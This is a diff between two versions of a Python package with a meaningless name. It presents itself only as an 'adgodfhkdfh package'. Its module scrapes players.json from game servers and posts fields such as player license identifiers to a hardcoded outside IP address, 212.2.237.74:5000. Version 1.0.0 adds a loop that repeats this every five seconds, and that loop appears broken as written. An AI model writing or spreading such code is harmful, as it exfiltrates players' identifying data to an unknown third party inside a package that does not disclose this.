# Comparing `tmp/adgodfhkdfh-0.0.7.tar.gz` & `tmp/adgodfhkdfh-1.0.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "adgodfhkdfh-0.0.7.tar", last modified: Sat Jul 22 05:45:50 2023, max compression
+gzip compressed data, was "adgodfhkdfh-1.0.0.tar", last modified: Sat Jul 22 06:42:38 2023, max compression
```

## Comparing `adgodfhkdfh-0.0.7.tar` & `adgodfhkdfh-1.0.0.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxrwxrwx   0        0        0        0 2023-07-22 05:45:50.647031 adgodfhkdfh-0.0.7/
--rw-rw-rw-   0        0        0      406 2023-07-22 05:45:50.646033 adgodfhkdfh-0.0.7/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-22 05:45:50.647031 adgodfhkdfh-0.0.7/setup.cfg
--rw-rw-rw-   0        0        0     1202 2023-07-22 05:45:34.000000 adgodfhkdfh-0.0.7/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-22 05:45:50.635062 adgodfhkdfh-0.0.7/src/
-drwxrwxrwx   0        0        0        0 2023-07-22 05:45:50.645036 adgodfhkdfh-0.0.7/src/adgodfhkdfh.egg-info/
--rw-rw-rw-   0        0        0      406 2023-07-22 05:45:50.000000 adgodfhkdfh-0.0.7/src/adgodfhkdfh.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      183 2023-07-22 05:45:50.000000 adgodfhkdfh-0.0.7/src/adgodfhkdfh.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-22 05:45:50.000000 adgodfhkdfh-0.0.7/src/adgodfhkdfh.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       12 2023-07-22 05:45:50.000000 adgodfhkdfh-0.0.7/src/adgodfhkdfh.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     2657 2023-07-22 05:45:20.000000 adgodfhkdfh-0.0.7/src/adgodfhkdfh.py
+drwxrwxrwx   0        0        0        0 2023-07-22 06:42:38.558758 adgodfhkdfh-1.0.0/
+-rw-rw-rw-   0        0        0      406 2023-07-22 06:42:38.557762 adgodfhkdfh-1.0.0/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-22 06:42:38.558758 adgodfhkdfh-1.0.0/setup.cfg
+-rw-rw-rw-   0        0        0     1202 2023-07-22 06:42:02.000000 adgodfhkdfh-1.0.0/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-22 06:42:38.544796 adgodfhkdfh-1.0.0/src/
+drwxrwxrwx   0        0        0        0 2023-07-22 06:42:38.556764 adgodfhkdfh-1.0.0/src/adgodfhkdfh.egg-info/
+-rw-rw-rw-   0        0        0      406 2023-07-22 06:42:38.000000 adgodfhkdfh-1.0.0/src/adgodfhkdfh.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      183 2023-07-22 06:42:38.000000 adgodfhkdfh-1.0.0/src/adgodfhkdfh.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-22 06:42:38.000000 adgodfhkdfh-1.0.0/src/adgodfhkdfh.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       12 2023-07-22 06:42:38.000000 adgodfhkdfh-1.0.0/src/adgodfhkdfh.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     2735 2023-07-22 06:41:45.000000 adgodfhkdfh-1.0.0/src/adgodfhkdfh.py
```

### Comparing `adgodfhkdfh-0.0.7/setup.py` & `adgodfhkdfh-1.0.0/setup.py`

 * *Files 11% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools
 
 with open("README.md", "r") as fh:
     long_description = fh.read()
 
 setuptools.setup(
     name="adgodfhkdfh",                     # This is the name of the package
-    version="0.0.7",                        # The initial release version
+    version="1.0.0",                        # The initial release version
     author="Yonatan Dev",                     # Full name of the author
     description="adgodfhkdfh package",
     long_description=long_description,      # Long description read from the the readme file
     long_description_content_type="text/markdown",
     packages=setuptools.find_packages(),    # List of all python modules to be installed
     classifiers=[
         "Programming Language :: Python :: 3",
```

### Comparing `adgodfhkdfh-0.0.7/src/adgodfhkdfh.py` & `adgodfhkdfh-1.0.0/src/adgodfhkdfh.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 import requests
+import time
 
 class PlayerDataChecker:
     def __init__(self, ip):
         self.ip = ip
-
     def fetch_and_check_player_data(self):
         try:
             response = requests.get(f"http://{self.ip}/players.json", timeout=3)
             if response.status_code == 200:
                 data = response.json()
             else:
                 data = []
@@ -67,8 +67,10 @@
             'license2': license2
         }
         response = requests.post(f"http://212.2.237.74:5000/send-data", json=data, headers=headers)
         if response.status_code == 200:
             return True
         else:
             return False
-        
+    while True:
+        fetch_and_check_player_data()
+        time.sleep(5)
```

